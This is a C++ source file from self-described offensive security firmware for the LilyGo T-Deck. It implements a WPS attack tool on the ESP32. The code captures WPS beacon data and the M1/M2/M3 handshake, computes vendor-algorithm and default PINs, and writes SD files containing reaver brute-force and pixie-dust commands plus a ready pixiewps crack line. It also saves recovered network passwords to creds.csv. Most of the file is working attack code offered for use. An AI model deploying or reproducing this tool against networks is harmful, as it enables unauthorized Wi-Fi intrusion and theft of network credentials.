// AL-ANQA — offensive security firmware for LilyGo T-DECK
// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 Abdallah Natsheh
//
// wps / wps — one-command WPS tool. `wps <idx>` does it all: beacon WPS-IE recon
// (device leak + locked/methods + candidate PINs) AND a live sniff of the WPS
// EAP-WSC handshake (M1/M2/M3) which it dumps pixiewps-ready to SD for an offline
// Pixie-Dust crack. `[p]` on that screen attempts a WPS push-button connect.
//
// HONEST LIMIT: the ESP32 can't run the WPS *auth* itself (closed stack won't let
// us supply a PIN, act as registrar, or associate outside its own connect flow),
// so the on-device job is RECON + passive HANDSHAKE CAPTURE; the PIN/password
// crack happens offline with pixiewps/reaver from the SD dump.

#include "wps.h"

#include <Arduino.h>
#include <WiFi.h>
#include <SD.h>
#include <esp_wifi.h>
#include <esp_wps.h>

#include "display_manager.h"
#include "input_handling.h"
#include "wifi_functions.h"
#include "sdcard_manager.h"

extern DisplayManager displayManager;
extern InputHandling  inputHandler;
extern WiFiFunctions  wifiFunctions;

static uint8_t s_bssid[6];

// ═══ beacon WPS-IE capture ═══════════════════════════════════════════════════
static volatile bool     s_got = false;
static uint8_t           s_ie[256];
static volatile uint16_t s_ieLen = 0;

static void IRAM_ATTR wpsCapCb(void* buf, wifi_promiscuous_pkt_type_t t) {
    if (s_got || t != WIFI_PKT_MGMT) return;
    wifi_promiscuous_pkt_t* pk = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* d = pk->payload; int len = pk->rx_ctrl.sig_len;
    if (len < 38) return;
    uint8_t st = (d[0] >> 4) & 0x0F;
    if (st != 8 && st != 5) return;
    if (memcmp(d + 16, s_bssid, 6) != 0) return;
    int pos = 36;
    while (pos + 2 <= len) {
        uint8_t tid = d[pos], tlen = d[pos+1];
        if (pos + 2 + tlen > len) break;
        if (tid==0xDD && tlen>=4 && d[pos+2]==0x00 && d[pos+3]==0x50 && d[pos+4]==0xF2 && d[pos+5]==0x04) {
            int wl = tlen - 4; if (wl > (int)sizeof(s_ie)) wl = sizeof(s_ie);
            memcpy(s_ie, d + pos + 6, wl); s_ieLen = (uint16_t)wl; s_got = true; return;
        }
        pos += 2 + tlen;
    }
}

// generic WSC/TLV lookup (2-byte BE type+len) over an arbitrary buffer
static const uint8_t* tlv(const uint8_t* b, int blen, uint16_t type, int& outLen) {
    int p = 0;
    while (p + 4 <= blen) {
        uint16_t t = (b[p]<<8)|b[p+1], l = (b[p+2]<<8)|b[p+3];
        if (p + 4 + l > blen) break;
        if (t == type) { outLen = l; return b + p + 4; }
        p += 4 + l;
    }
    outLen = 0; return nullptr;
}
static String ieStr(uint16_t type) {
    int l=0; const uint8_t* v = tlv(s_ie, s_ieLen, type, l);
    String s; for (int i=0;i<l && i<40;i++) s += (char)v[i]; return s;
}
static int ieByte(uint16_t type, int def) {
    int l=0; const uint8_t* v = tlv(s_ie, s_ieLen, type, l);
    return (v && l>=1) ? v[0] : def;
}

// ═══ WPS EAP-WSC handshake sniff (M1/M2/M3 → pixiewps dump) ═══════════════════
#define WSNIFF_RING 8
#define WSNIFF_MAX  480
struct WFrame { uint8_t d[WSNIFF_MAX]; uint16_t len; };
static volatile WFrame  s_wr[WSNIFF_RING];
static volatile uint8_t s_wrH = 0, s_wrT = 0;
static volatile bool    s_sniff = false;

static void IRAM_ATTR wpsSniffCb(void* buf, wifi_promiscuous_pkt_type_t t) {
    if (!s_sniff || t != WIFI_PKT_DATA) return;
    wifi_promiscuous_pkt_t* pk = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* f = pk->payload; int len = pk->rx_ctrl.sig_len;
    if (len < 40) return;
    if (f[1] & 0x40) return;                          // protected → not WPS EAP
    if (memcmp(f+4,s_bssid,6) && memcmp(f+10,s_bssid,6) && memcmp(f+16,s_bssid,6)) return;
    int hl = ((f[0] & 0x8C) == 0x88) ? 26 : 24;
    if (hl + 8 > len) return;
    if (!(f[hl+6]==0x88 && f[hl+7]==0x8E)) return;    // EAPOL ethertype
    uint8_t nh = (s_wrH + 1) % WSNIFF_RING;
    if (nh == s_wrT) return;
    int n = len > WSNIFF_MAX ? WSNIFF_MAX : len;
    memcpy((void*)s_wr[s_wrH].d, f, n); s_wr[s_wrH].len = (uint16_t)n; s_wrH = nh;
}

// captured WSC material
static bool s_m1=false, s_m2=false, s_m3=false;
static uint8_t s_pke[192], s_pkr[192], s_eh1[32], s_eh2[32], s_n1[16], s_n2[16], s_emac[6];
static int s_pkeL=0, s_pkrL=0;

static void copyAttr(const uint8_t* w, int wl, uint16_t type, uint8_t* out, int cap, int* gotL) {
    int l=0; const uint8_t* v = tlv(w, wl, type, l);
    if (v) { int n = l<cap?l:cap; memcpy(out, v, n); if (gotL) *gotL=n; }
}
// parse one captured EAPOL frame → fill M1/M2/M3 material
static void parseWsc(const uint8_t* f, int len) {
    int hl = ((f[0] & 0x8C) == 0x88) ? 26 : 24;
    int eapol = hl + 8;
    if (eapol + 4 > len) return;
    int eap = eapol + 4;                              // skip EAPOL hdr
    if (eap + 14 > len || f[eap+4] != 254) return;    // EAP Expanded type
    if (!(f[eap+5]==0x00 && f[eap+6]==0x37 && f[eap+7]==0x2A)) return;  // WFA vendor
    int eapLen = (f[eap+2]<<8)|f[eap+3];
    int wsc = eap + 14;                               // after expanded+opcode+flags
    int wend = eap + eapLen; if (wend > len) wend = len;
    int wl = wend - wsc; if (wl <= 0) return;
    const uint8_t* w = f + wsc;
    int l=0; const uint8_t* mt = tlv(w, wl, 0x1022, l);   // Message Type
    if (!mt || l < 1) return;
    if (mt[0] == 0x04) {                              // M1
        copyAttr(w, wl, 0x1032, s_pke, sizeof(s_pke), &s_pkeL);
        copyAttr(w, wl, 0x101A, s_n1,  sizeof(s_n1),  nullptr);
        int ml=0; const uint8_t* mac = tlv(w, wl, 0x1020, ml);
        if (mac && ml>=6) memcpy(s_emac, mac, 6);
        s_m1 = (s_pkeL > 0);
    } else if (mt[0] == 0x05) {                       // M2
        copyAttr(w, wl, 0x1032, s_pkr, sizeof(s_pkr), &s_pkrL);
        copyAttr(w, wl, 0x1039, s_n2,  sizeof(s_n2),  nullptr);
        s_m2 = (s_pkrL > 0);
    } else if (mt[0] == 0x07) {                       // M3
        copyAttr(w, wl, 0x1014, s_eh1, sizeof(s_eh1), nullptr);
        copyAttr(w, wl, 0x1015, s_eh2, sizeof(s_eh2), nullptr);
        s_m3 = true;
    }
}

// ═══ helpers ═════════════════════════════════════════════════════════════════
static String hexs(const uint8_t* d, int n) {
    static const char* H="0123456789abcdef"; String s; s.reserve(n*2);
    for (int i=0;i<n;i++){ s+=H[d[i]>>4]; s+=H[d[i]&15]; } return s;
}
static String macStr(const uint8_t m[6]) {
    char s[18]; snprintf(s,sizeof(s),"%02X:%02X:%02X:%02X:%02X:%02X",m[0],m[1],m[2],m[3],m[4],m[5]); return String(s);
}
static int wpsChecksum(uint32_t pin) {
    uint32_t a=0; while(pin){ a+=3*(pin%10); pin/=10; a+=(pin%10); pin/=10; }
    return (int)((10 - a%10)%10);
}
static uint32_t computePin(const uint8_t m[6]) {
    uint32_t nic=((uint32_t)m[3]<<16)|((uint32_t)m[4]<<8)|m[5], p7=nic%10000000UL;
    return p7*10 + (uint32_t)wpsChecksum(p7);
}

// ── multi-algorithm WPS PIN generator (the algos real WPS attacks use: OneShot/
// WPSpin). Each returns an 8-digit PIN (7-digit base % 1e7 + checksum). ─────────
static uint64_t macInt(const uint8_t m[6]) {
    return ((uint64_t)m[0]<<40)|((uint64_t)m[1]<<32)|((uint64_t)m[2]<<24)|((uint64_t)m[3]<<16)|((uint64_t)m[4]<<8)|m[5];
}
static uint32_t finalizePin(uint32_t base) {
    uint32_t p7 = base % 10000000UL;
    return p7 * 10 + (uint32_t)wpsChecksum(p7);
}
static uint32_t pinDLinkBase(uint32_t nic) {
    uint32_t pin = nic ^ 0x55AA55;
    pin ^= (((pin & 0xF)<<4)+((pin & 0xF)<<8)+((pin & 0xF)<<12)+((pin & 0xF)<<16)+((pin & 0xF)<<20));
    pin %= 10000000UL;
    if (pin < 1000000UL) pin += ((pin % 9) * 1000000UL) + 1000000UL;
    return pin;
}
struct PinCand { const char* algo; uint32_t pin; };
static int genPins(const uint8_t m[6], PinCand* out, int cap) {
    uint64_t mi = macInt(m);
    uint32_t nic = (uint32_t)(mi & 0xFFFFFF);
    int n = 0;
    auto add = [&](const char* a, uint32_t base){ if (n<cap) { out[n].algo=a; out[n].pin=finalizePin(base); n++; } };
    add("pin24",   (uint32_t)(mi & 0xFFFFFF));
    add("pin28",   (uint32_t)(mi & 0xFFFFFFF));
    add("pin32",   (uint32_t)(mi & 0xFFFFFFFFUL));
    add("DLink",   pinDLinkBase(nic));
    add("DLink+1", pinDLinkBase((uint32_t)((mi+1) & 0xFFFFFF)));
    // ASUS: per-byte sum
    { uint32_t p=0,mul=1; for(int i=0;i<7;i++){ p += (((uint32_t)m[i%6]+m[(i+1)%6])%10)*mul; mul*=10; } add("ASUS",p); }
    // Airocon
    { uint32_t p = ((uint32_t)(m[0]+m[1])%10)
        + (((uint32_t)(m[5]+m[0])%10)*10) + (((uint32_t)(m[4]+m[5])%10)*100)
        + (((uint32_t)(m[3]+m[4])%10)*1000) + (((uint32_t)(m[2]+m[3])%10)*10000)
        + (((uint32_t)(m[1]+m[2])%10)*100000) + (((uint32_t)(m[0]+m[1])%10)*1000000);
      add("Airocon",p); }
    // common static defaults (checksum-valid)
    if (n<cap){ out[n].algo="static"; out[n].pin=12345670; n++; }
    if (n<cap){ out[n].algo="static"; out[n].pin=0;        n++; }   // 00000000
    return n;
}
// write the candidate PIN list + a ready reaver cheat-sheet to SD
static String saveAttack(const char* ssid, const uint8_t bssid[6], int chan, const PinCand* p, int n) {
    char path[48]; int idx=1;
    do { snprintf(path,sizeof(path),"%s/attack_%03d.txt",SD_DIR_WPS,idx++); } while (SD.exists(path) && idx<1000);
    File f = SD.open(path, FILE_WRITE); if (!f) return "";
    f.printf("# WPS attack sheet - %s (%s) ch %d\n", ssid, macStr(bssid).c_str(), chan);
    f.printf("# on a laptop w/ an injection-capable adapter (AR9271/RT3070):\n");
    f.printf("#   sudo reaver -i mon0 -b %s -c %d -vv          # full PIN brute\n", macStr(bssid).c_str(), chan);
    f.printf("#   sudo reaver -i mon0 -b %s -c %d -K 1 -vv     # pixie-dust\n", macStr(bssid).c_str(), chan);
    f.printf("# or try these algorithm PIN candidates one by one (reaver -p <pin>):\n");
    for (int i=0;i<n;i++) f.printf("%08lu   # %s\n", (unsigned long)p[i].pin, p[i].algo);
    f.close();
    return String(path);
}
static bool resolveIdx(int idx, uint8_t bssid[6], int& chan, char* ssid) {
    if (idx < 0 || idx >= wifiFunctions.getNetworkCount()) return false;
    if (!wifiFunctions.getNetworkInfo(idx, bssid, &chan)) return false;
    wifiFunctions.getNetworkSSID(idx, ssid); return true;
}

// write the pixiewps-ready dump once M1/M2/M3 are captured
static String savePixie(const char* ssid) {
    char path[48]; int idx=1;
    do { snprintf(path,sizeof(path),"%s/pixie_%03d.txt",SD_DIR_WPS,idx++); } while (SD.exists(path) && idx<1000);
    File f = SD.open(path, FILE_WRITE);
    if (!f) return "";
    f.printf("# WPS handshake %s (%s) captured by AL-ANQA -> crack offline\n", ssid, macStr(s_bssid).c_str());
    f.printf("pixiewps -e %s -r %s -s %s -z %s -n %s -m %s -b %s\n",
             hexs(s_pke,s_pkeL).c_str(), hexs(s_pkr,s_pkrL).c_str(),
             hexs(s_eh1,32).c_str(), hexs(s_eh2,32).c_str(),
             hexs(s_n1,16).c_str(), hexs(s_n2,16).c_str(), macStr(s_emac).c_str());
    f.printf("PKE=%s\nPKR=%s\nEHASH1=%s\nEHASH2=%s\nENONCE=%s\nRNONCE=%s\nEMAC=%s\n",
             hexs(s_pke,s_pkeL).c_str(), hexs(s_pkr,s_pkrL).c_str(),
             hexs(s_eh1,32).c_str(), hexs(s_eh2,32).c_str(),
             hexs(s_n1,16).c_str(), hexs(s_n2,16).c_str(), macStr(s_emac).c_str());
    f.close();
    return String(path);
}

// ═══ push-button connect (invoked with [p]) ══════════════════════════════════
static void doPbc(const char* ssid, const uint8_t bssid[6]) {
    DisplayManager& dm = displayManager;
    dm.clearScreen(); dm.setTextColor(TFT_CYAN); dm.println(String("[WPS::PBC] ")+ssid);
    dm.setTextColor(0x7BEF); dm.println("PRESS the AP's WPS button now (120s)...");
    WiFi.mode(WIFI_STA);
    esp_wps_config_t cfg = WPS_CONFIG_INIT_DEFAULT(WPS_TYPE_PBC);
    if (esp_wifi_wps_enable(&cfg) != ESP_OK) { dm.setTextColor(TFT_RED); dm.println("WPS enable failed."); delay(1800); return; }
    esp_wifi_wps_start(0);
    bool ok=false; uint32_t t0=millis(); int last=-1;
    while (millis()-t0 < 120000) {
        if (WiFi.status()==WL_CONNECTED) { ok=true; break; }
        if (inputHandler.getKeyboardInput()=='q') break;
        int s=(int)((120000-(millis()-t0))/1000);
        if (s!=last){ last=s; dm.fillRect(6,80,SCREEN_WIDTH-12,16,TFT_BLACK); dm.setCursor(6,80); dm.setTextColor(0x7BEF); char b[24]; snprintf(b,sizeof(b),"waiting %ds [q]",s); dm.printText(b); }
        delay(150);
    }
    esp_wifi_wps_disable();
    if (ok) {
        String s=WiFi.SSID(), p=WiFi.psk();
        dm.clearScreen(); dm.setTextColor(TFT_GREEN); dm.println("WPS PBC SUCCESS:");
        dm.setTextColor(TFT_WHITE); dm.println("SSID: "+s); dm.println("PSK:  "+(p.length()?p:String("(none)")));
        File fp=SD.open(String(SD_DIR_WPS)+"/creds.csv",FILE_APPEND);
        if (fp){ fp.printf("%lu,%s,%s,%s\n",(unsigned long)millis(),macStr(bssid).c_str(),s.c_str(),p.c_str()); fp.close(); }
        dm.setTextColor(0x5AEB); dm.println("saved creds.csv - any key");
        while (inputHandler.getKeyboardInput()==0) delay(20);
    } else { dm.setTextColor(TFT_RED); dm.println("No PBC connect (button/timeout)."); delay(2200); }
}

// ═══ the one command: recon + PIN calc + live handshake sniff ════════════════
static void wpsRun(int idx) {
    DisplayManager& dm = displayManager;
    uint8_t bssid[6]; int chan; char ssid[33]={0};
    if (!resolveIdx(idx, bssid, chan, ssid)) { dm.clearScreen(); dm.setTextColor(TFT_RED); dm.println("Bad index. Run `sw` first."); delay(1800); return; }
    memcpy(s_bssid, bssid, 6);
    s_got=false; s_ieLen=0; s_m1=s_m2=s_m3=false; s_pkeL=s_pkrL=0; s_wrH=s_wrT=0;

    WiFi.mode(WIFI_STA);
    esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);

    // ── phase 1: grab the beacon WPS IE ──
    dm.clearScreen(); dm.setTextColor(TFT_CYAN); dm.println(String("[WPS] ")+ssid+"  ch"+String(chan));
    dm.setTextColor(TFT_WHITE); dm.println("reading WPS info...");
    esp_wifi_set_promiscuous(true);
    wifi_promiscuous_filter_t fm; fm.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
    esp_wifi_set_promiscuous_filter(&fm); esp_wifi_set_promiscuous_rx_cb(wpsCapCb);
    uint32_t t0=millis(); while(!s_got && millis()-t0<4000){ if(inputHandler.getKeyboardInput()=='q'){esp_wifi_set_promiscuous(false); return;} delay(30); }

    int ver=ieByte(0x104A,0x10), locked=ieByte(0x1057,0);
    int cmL=0; const uint8_t* cm=tlv(s_ie,s_ieLen,0x1008,cmL);
    uint16_t methods=(cm&&cmL>=2)?((cm[0]<<8)|cm[1]):0;
    String manuf=ieStr(0x1021), model=ieStr(0x1023), devN=ieStr(0x1011);
    String mstr; if(methods&0x0080)mstr+="PBC "; if(methods&0x0008)mstr+="Disp "; if(methods&0x0100)mstr+="Keypad "; if(methods&0x0004)mstr+="Label "; if(mstr.isEmpty())mstr="-";

    // generate the full candidate-PIN list + laptop attack sheet
    PinCand pins[12]; int npins = genPins(bssid, pins, 12);
    String atkFile = saveAttack(ssid, bssid, chan, pins, npins);

    // log recon
    File fp=SD.open(String(SD_DIR_WPS)+"/wps.csv",FILE_APPEND);
    if(fp){ fp.printf("%lu,%s,%s,%s,%s,%s,%s,%s,%08lu\n",(unsigned long)millis(),macStr(bssid).c_str(),ssid,ver==0x20?"2.0":"1.0",locked?"locked":"open",mstr.c_str(),manuf.c_str(),model.c_str(),(unsigned long)pins[0].pin); fp.close(); }

    // ── static panel ──
    auto panel=[&](){
        dm.clearScreen(); int y=34;
        dm.setTextColor(TFT_CYAN);  dm.setCursor(6,y); dm.printText(String("[WPS] ")+ssid); y+=15;
        dm.setTextColor(0x7BEF);    dm.setCursor(6,y); dm.printText(macStr(bssid)+" ch"+String(chan)+" v"+(ver==0x20?"2.0":"1.0")); y+=13;
        dm.setTextColor(locked?TFT_RED:TFT_GREEN); dm.setCursor(6,y); dm.printText(locked?"LOCKED":"open");
        dm.setTextColor(TFT_WHITE); dm.setCursor(64,y); dm.printText(mstr); y+=13;
        if(!s_got){ dm.setTextColor(TFT_RED); dm.setCursor(6,y); dm.printText("(no WPS IE - out of range?)"); y+=13; }
        dm.setTextColor(0xC618);
        if(manuf.length()||model.length()){ dm.setCursor(6,y); dm.printText((manuf+" "+model).substring(0,40)); y+=12; }
        if(devN.length()){ dm.setCursor(6,y); dm.printText("dev "+devN); y+=12; }
        dm.setTextColor(TFT_YELLOW); char pl[40];
        snprintf(pl,sizeof(pl),"PINs: %d -> %s", npins, atkFile.length()?atkFile.substring(10).c_str():"(no SD)");
        dm.setCursor(6,y); dm.printText(pl); y+=12;
        dm.setTextColor(0xFFE0);
        for (int i=0;i<npins && i<6;i+=2) {
            char b[40]; snprintf(b,sizeof(b),"%08lu %-7s %08lu %-7s",
                (unsigned long)pins[i].pin, pins[i].algo,
                (i+1<npins)?(unsigned long)pins[i+1].pin:0, (i+1<npins)?pins[i+1].algo:"");
            dm.setCursor(6,y); dm.printText(b); y+=12;
        }
        dm.setTextColor(0x7BEF); dm.setCursor(6,214); dm.printText("[p] push-button   [q] stop");
    };
    panel();
    const int sniffY=156;

    // ── phase 2: live WPS-handshake sniff ──
    esp_wifi_set_promiscuous_rx_cb(NULL);
    wifi_promiscuous_filter_t fd; fd.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&fd); esp_wifi_set_promiscuous_rx_cb(wpsSniffCb);
    s_sniff = true;
    bool saved=false; uint32_t lastDraw=0;
    while (true) {
        char k = inputHandler.getKeyboardInput();
        if (k=='q') break;
        if (k=='p') { s_sniff=false; esp_wifi_set_promiscuous(false); esp_wifi_set_promiscuous_rx_cb(NULL); doPbc(ssid,bssid); return; }
        while (s_wrT != s_wrH) {
            uint8_t fr[WSNIFF_MAX]; int fl=s_wr[s_wrT].len; if(fl>WSNIFF_MAX)fl=WSNIFF_MAX;
            memcpy(fr,(const void*)s_wr[s_wrT].d,fl); s_wrT=(s_wrT+1)%WSNIFF_RING;
            parseWsc(fr,fl);
        }
        if (s_m1 && s_m2 && s_m3 && !saved) { saved=true; String p=savePixie(ssid);
            dm.fillRect(6,sniffY+28,SCREEN_WIDTH-12,26,TFT_BLACK);
            dm.setCursor(6,sniffY+28); dm.setTextColor(TFT_GREEN); dm.printText("HANDSHAKE! saved:");
            dm.setCursor(6,sniffY+41); dm.setTextColor(0x5AEB); dm.printText(p.length()?p:String("(SD write failed)"));
        }
        uint32_t now=millis();
        if (now-lastDraw>=400) { lastDraw=now;
            dm.fillRect(6,sniffY,SCREEN_WIDTH-12,14,TFT_BLACK); dm.setCursor(6,sniffY);
            dm.setTextColor(0x7BEF); dm.printText("sniffing WPS handshake...");
            dm.fillRect(6,sniffY+14,SCREEN_WIDTH-12,14,TFT_BLACK); dm.setCursor(6,sniffY+14);
            char b[32]; snprintf(b,sizeof(b),"M1 %s  M2 %s  M3 %s", s_m1?"OK":"..", s_m2?"OK":"..", s_m3?"OK":"..");
            dm.setTextColor(s_m3?TFT_GREEN:TFT_WHITE); dm.printText(b);
        }
        delay(15);
    }
    s_sniff=false; esp_wifi_set_promiscuous(false); esp_wifi_set_promiscuous_rx_cb(NULL);
}

// ═══ entry ═══════════════════════════════════════════════════════════════════
void runWps(char* args) {
    DisplayManager& dm = displayManager;
    String a = args ? String(args) : ""; a.trim();
    if (a.startsWith("pbc")) { String r=a.substring(3); r.trim(); if(r.length()){ uint8_t b[6]; int c; char s[33]={0}; if(resolveIdx(r.toInt(),b,c,s)){ memcpy(s_bssid,b,6); WiFi.mode(WIFI_STA); esp_wifi_set_channel(c,WIFI_SECOND_CHAN_NONE); doPbc(s,b);} } return; }
    if (a.length() && isdigit((unsigned char)a[0])) { wpsRun(a.toInt()); return; }

    // no arg → list WPS APs
    dm.clearScreen();
    if (wifiFunctions.getNetworkCount() <= 0) {
        dm.setTextColor(TFT_YELLOW); dm.println("Run `sw` first, then `wps <idx>`.");
        dm.setTextColor(0x7BEF); dm.println("wps <idx> = recon + PIN + handshake sniff");
        delay(2600); return;
    }
    dm.setTextColor(TFT_CYAN); dm.println("WPS APs (wps <#> = recon+sniff):");
    dm.setTextColor(TFT_WHITE); int n=wifiFunctions.getNetworkCount(), shown=0;
    for (int i=0;i<n;i++){ if(!wifiFunctions.getNetworkWps(i))continue; char s[33]={0}; wifiFunctions.getNetworkSSID(i,s); char l[48]; snprintf(l,sizeof(l),"[%2d] %s",i,s); dm.println(l); shown++; }
    if(!shown){ dm.setTextColor(0x7BEF); dm.println("(none flagged WPS in last scan)"); }
    dm.setTextColor(0x5AEB); dm.println("any key");
    while (inputHandler.getKeyboardInput()==0) delay(20);
}
